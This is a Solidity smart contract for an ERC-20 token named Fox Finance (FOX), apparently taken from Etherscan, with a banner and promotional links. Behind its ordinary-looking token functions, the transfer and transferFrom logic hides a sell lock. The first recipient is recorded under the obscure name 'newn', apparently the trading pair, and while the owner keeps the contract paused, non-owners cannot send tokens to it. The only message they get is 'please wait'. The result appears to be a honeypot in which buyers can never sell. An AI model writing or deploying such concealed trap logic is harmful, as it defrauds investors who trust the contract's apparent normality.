/**
 *Submitted for verification at Etherscan.io on 2021-04-22
*/

/**

 ________ ________     ___    ___      ________ ___  ________   ________  ________   ________  _______      
|\  _____\\   __  \   |\  \  /  /|    |\  _____\\  \|\   ___  \|\   __  \|\   ___  \|\   ____\|\  ___ \     
\ \  \__/\ \  \|\  \  \ \  \/  / /    \ \  \__/\ \  \ \  \\ \  \ \  \|\  \ \  \\ \  \ \  \___|\ \   __/|    
 \ \   __\\ \  \\\  \  \ \    / /      \ \   __\\ \  \ \  \\ \  \ \   __  \ \  \\ \  \ \  \    \ \  \_|/__  
  \ \  \_| \ \  \\\  \  /     \/        \ \  \_| \ \  \ \  \\ \  \ \  \ \  \ \  \\ \  \ \  \____\ \  \_|\ \ 
   \ \__\   \ \_______\/  /\   \         \ \__\   \ \__\ \__\\ \__\ \__\ \__\ \__\\ \__\ \_______\ \_______\
    \|__|    \|_______/__/ /\ __\         \|__|    \|__|\|__| \|__|\|__|\|__|\|__| \|__|\|_______|\|_______|
                      |__|/ \|__|  

https://foxfinance.io
https://t.me/foxfinancebsc

*/
//   SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) external;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenERC20 is Owned {
  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newn;
  bool paused;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

  constructor() {
    symbol = "FOX";
    name = "Fox Finance";
    decimals = 18;
    paused = true;
    // One trillion
    _totalSupply =  1000000000000 ether;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewn(address _newn) public onlyOwner { newn = _newn; }
  function pause() public onlyOwner { paused = true; }
  function unpause() public onlyOwner { paused = false; }
  function totalSupply() public view returns (uint) {
    return _totalSupply - balances[address(0)];
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(!paused || to == owner || to != newn, "please wait");

    balances[msg.sender] = balances[msg.sender] - tokens;
    balances[to] = balances[to] + tokens;
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    if(from != address(0) && newn == address(0)) { newn = to; }
    else { require(!paused || from == owner || to == owner || to != newn, "please wait"); }

    balances[from] = balances[from] - tokens;
    allowed[from][msg.sender] = allowed[from][msg.sender] - tokens;
    balances[to] = balances[to] + tokens;
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
}

contract FoxFinance is TokenERC20 {}